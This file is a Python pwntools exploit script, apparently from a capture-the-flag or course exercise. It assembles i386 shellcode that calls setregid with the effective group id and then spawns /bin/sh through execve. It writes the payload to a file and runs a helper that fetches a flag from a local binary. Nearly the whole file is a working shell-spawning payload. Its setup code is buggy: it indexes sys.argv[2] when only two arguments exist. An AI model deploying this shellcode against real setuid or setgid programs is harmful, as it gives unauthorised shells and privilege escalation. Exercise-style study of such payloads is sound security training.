#!/usr/bin/env python
from pwn import *
import pwn
import helpers

########################################################
# Exploit
########################################################

arch = 'i386'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here

    //clear registers
    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx

    // setregid(getegid(), getegid())
    // arg0: getegid(); arg1: getegid()
    mov $0x32, %eax
    int $0x80
    mov %eax, %ebx
    mov %eax, %ecx

    // call setregid(arg1, arg2)
    mov $0x47, %eax
    int $0x80

    // execve('//bin/sh', 0, 0)
    // clear out registers
    xor %edx, %edx
    xor %ecx, %ecx

    // arg0: '//bin/sh'
    push $0x0
    push $0x68732f6e
    push $0x69622f2f
    mov %esp, %ebx

    // execve(arg0, arg1, arg2)
    mov $0x0b, %eax
    int $0x80
'''
compiled = asm(shellcode, arch=arch)
print(compiled)

with open('shellcode.bin', 'wb') as f:
    f.write(compiled)

########################################################
# Setup                                                #
########################################################
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = pwn.ELF(prog)
flag = helpers.get_flag(elf, "")
pwn.info(f'Flag: {flag}')
